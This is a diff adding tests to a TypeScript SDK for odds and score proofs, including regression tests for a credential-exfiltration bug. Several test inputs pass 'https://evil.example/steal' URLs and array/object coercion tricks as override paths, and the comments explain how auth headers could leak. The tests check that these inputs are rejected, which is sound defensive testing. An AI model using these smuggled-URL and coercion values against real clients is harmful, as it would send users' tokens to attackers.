@@ -6,7 +6,7 @@ import { resolveClientConfig } from "../src/core.js";
 import { DataClient } from "../src/data.js";
 import { HttpError, ProofError, VerificationError } from "../src/errors.js";
 import { HttpPipeline } from "../src/http.js";
-import { dailyScoresPda, deriveRootPda, healTimestampMillis, merkleRootFromLeaf, OnchainClient, verifyMerklePath } from "../src/onchain.js";
+import { dailyScoresPda, deriveRootPda, healTimestampMillis, merkleRootFromLeaf, OnchainClient, oddsBatchRootPda, verifyMerklePath } from "../src/onchain.js";
 import { decodeBytes32, isProofPending, normalizeProofBundle, ProofClient, waitForProofAvailability } from "../src/proofs.js";
 
 const bytes = (seed: number) => Array.from({ length: 32 }, (_, index) => (seed + index) % 256);
@@ -432,5 +432,113 @@ describe("root PDA namespaces and timestamp healing", () => {
       expect(deriveRootPda({ namespace: "daily_scores_roots", timestamp: smallMillis, timestampUnit: "ms", programId }).toBase58())
         .toBe(expected("daily_scores_roots", epochDay));
     });
+
+    test("oddsBatchRootPda (deriveRootPda's daily_batch_roots counterpart) gets the same Date/timestampUnit bypass", () => {
+      const epochDay = Math.floor(smallMillis / 86_400_000);
+      expect(oddsBatchRootPda(new Date(smallMillis), programId).toBase58())
+        .toBe(expected("daily_batch_roots", epochDay));
+      expect(oddsBatchRootPda(smallMillis, programId, "ms").toBase58())
+        .toBe(expected("daily_batch_roots", epochDay));
+    });
+  });
+});
+
+describe("experimental odds proofs", () => {
+  const request = { messageId: "m-77", timestamp: 1_783_828_320_792 };
+
+  test("fetches through the configurable path, decoding known fields and preserving raw", async () => {
+    const payload = {
+      oddsSubTreeProof: [node(11, false)],
+      mainTreeProof: [{ hash: Buffer.from(bytes(12)).toString("base64"), isRightSibling: true }],
+      batchRoot: `0x${Buffer.from(bytes(13)).toString("hex")}`,
+      vendorField: "kept",
+    };
+    const fetchMock = vi.fn(async () => new Response(JSON.stringify(payload), { status: 200 }));
+    const http = new HttpPipeline(resolveClientConfig({ network: "mainnet", baseUrl: "http://replay.test", fetch: fetchMock }));
+    const proofs = new ProofClient(http, {} as unknown as DataClient);
+    const proof = await proofs.fetchOdds(request);
+    expect(proof.oddsSubTreeProof).toEqual([{ hash: bytes(11), isRightSibling: false }]);
+    expect(proof.mainTreeProof).toEqual([{ hash: bytes(12), isRightSibling: true }]);
+    expect(proof.batchRoot).toEqual(bytes(13));
+    expect(proof.raw.vendorField).toBe("kept");
+    expect(String(fetchMock.mock.calls[0]![0])).toContain("/odds/validation?messageId=m-77");
+
+    await proofs.fetchOdds({ ...request, path: "/odds/proof-v2" });
+    expect(String(fetchMock.mock.calls[1]![0])).toContain("/odds/proof-v2?");
+  });
+
+  test("stays permissive about unknown shapes but rejects non-objects and bad inputs", async () => {
+    const http = new HttpPipeline(resolveClientConfig({ network: "mainnet", baseUrl: "http://replay.test", fetch: vi.fn(async () => new Response(JSON.stringify({ unexpected: true }), { status: 200 })) }));
+    const proofs = new ProofClient(http, {} as unknown as DataClient);
+    const proof = await proofs.fetchOdds(request);
+    expect(proof).toMatchObject({ messageId: "m-77", raw: { unexpected: true } });
+    expect(proof.batchRoot).toBeUndefined();
+    const bad = new ProofClient(new HttpPipeline(resolveClientConfig({ network: "mainnet", baseUrl: "http://replay.test", fetch: vi.fn(async () => new Response("[]", { status: 200 })) })), {} as unknown as DataClient);
+    await expect(bad.fetchOdds(request)).rejects.toMatchObject({ code: "ODDS_PROOF_RESPONSE_INVALID" });
+    await expect(bad.fetchOdds({ ...request, messageId: "" })).rejects.toMatchObject({ code: "ODDS_PROOF_MESSAGE_ID_INVALID" });
+    await expect(bad.fetchOdds({ ...request, timestamp: 1.5 })).rejects.toMatchObject({ code: "ODDS_PROOF_TIMESTAMP_INVALID" });
+  });
+
+  test("rides the availability retry and derives the odds batch root account", async () => {
+    const responses = [new Response("pending", { status: 425 }), new Response(JSON.stringify({}), { status: 200 })];
+    const fetchMock = vi.fn(async () => responses.shift()!);
+    const http = new HttpPipeline(resolveClientConfig({ network: "mainnet", baseUrl: "http://replay.test", fetch: fetchMock }));
+    const proofs = new ProofClient(http, {} as unknown as DataClient);
+    await proofs.fetchOdds({ ...request, retry: { initialDelayMs: 1, timeoutMs: 60_000 } });
+    expect(fetchMock).toHaveBeenCalledTimes(2);
+    const programId = new PublicKey("9ExbZjAapQww1vfcisDmrngPinHTEfpjYRWMunJgcKaA");
+    expect(oddsBatchRootPda(request.timestamp, programId).toBase58())
+      .toBe(deriveRootPda({ namespace: "daily_batch_roots", timestamp: request.timestamp, programId }).toBase58());
+  });
+
+  test("rejects an absolute or scheme-relative override path before any request fires (H2: credential exfiltration guard)", async () => {
+    // Regression for the H2 review bug: fetchOdds({ path }) is a public
+    // "route-drift override" field passed straight into
+    // this.http.request(...) with default auth: true. HttpPipeline.apiUrl
+    // passes any path matching /^https?:\/\// through UNCHANGED (no
+    // same-origin check), and the request pipeline attaches the live JWT +
+    // X-Api-Token headers regardless of destination -- so a caller-supplied
+    // absolute URL in `path` would get the authenticated request sent to
+    // that arbitrary origin. fetchOdds must reject before ever touching
+    // this.http.request.
+    const fetchMock = vi.fn(async () => new Response(JSON.stringify({}), { status: 200 }));
+    const http = new HttpPipeline(resolveClientConfig({ network: "mainnet", baseUrl: "http://replay.test", fetch: fetchMock }));
+    const proofs = new ProofClient(http, {} as unknown as DataClient);
+
+    await expect(proofs.fetchOdds({ ...request, path: "https://evil.example/steal" }))
+      .rejects.toMatchObject({ code: "ODDS_PROOF_PATH_INVALID" });
+    await expect(proofs.fetchOdds({ ...request, path: "HTTP://evil.example/steal" }))
+      .rejects.toMatchObject({ code: "ODDS_PROOF_PATH_INVALID" });
+    await expect(proofs.fetchOdds({ ...request, path: "//evil.example/steal" }))
+      .rejects.toMatchObject({ code: "ODDS_PROOF_PATH_INVALID" });
+    // Confirm no request was ever dispatched for any of the rejected paths.
+    expect(fetchMock).not.toHaveBeenCalled();
+
+    // A normal relative path still works.
+    await expect(proofs.fetchOdds({ ...request, path: "/odds/proof-v2" })).resolves.toMatchObject({ messageId: request.messageId });
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+    expect(String(fetchMock.mock.calls[0]![0])).toContain("/odds/proof-v2?");
+  });
+
+  test("rejects a non-string override path before any request fires (H2-residual: type-coercion bypass)", async () => {
+    // Regression for the H2-residual review bug: the original H2 guard was
+    // gated on `typeof options.path === "string"`, so a non-string `path`
+    // (e.g. a single-element array) skipped the regex check entirely, then
+    // got coerced to a plain string by the template literal at the fetch
+    // call site (`${options.path ?? DEFAULT_ODDS_PROOF_PATH}?${query}`).
+    // A single-element array stringifies via Array.prototype.toString with
+    // no separator, so `["https://evil.example/steal"]` coerces to exactly
+    // "https://evil.example/steal" -- the same credential-exfiltration
+    // vector H2 was meant to close, just via a different input shape.
+    const fetchMock = vi.fn(async () => new Response(JSON.stringify({}), { status: 200 }));
+    const http = new HttpPipeline(resolveClientConfig({ network: "mainnet", baseUrl: "http://replay.test", fetch: fetchMock }));
+    const proofs = new ProofClient(http, {} as unknown as DataClient);
+
+    await expect(proofs.fetchOdds({ ...request, path: ["https://evil.example/steal"] as unknown as string }))
+      .rejects.toMatchObject({ code: "ODDS_PROOF_PATH_INVALID" });
+    await expect(proofs.fetchOdds({ ...request, path: { toString: () => "https://evil.example/steal" } as unknown as string }))
+      .rejects.toMatchObject({ code: "ODDS_PROOF_PATH_INVALID" });
+    // Confirm no request was ever dispatched for either rejected shape.
+    expect(fetchMock).not.toHaveBeenCalled();
   });
 });
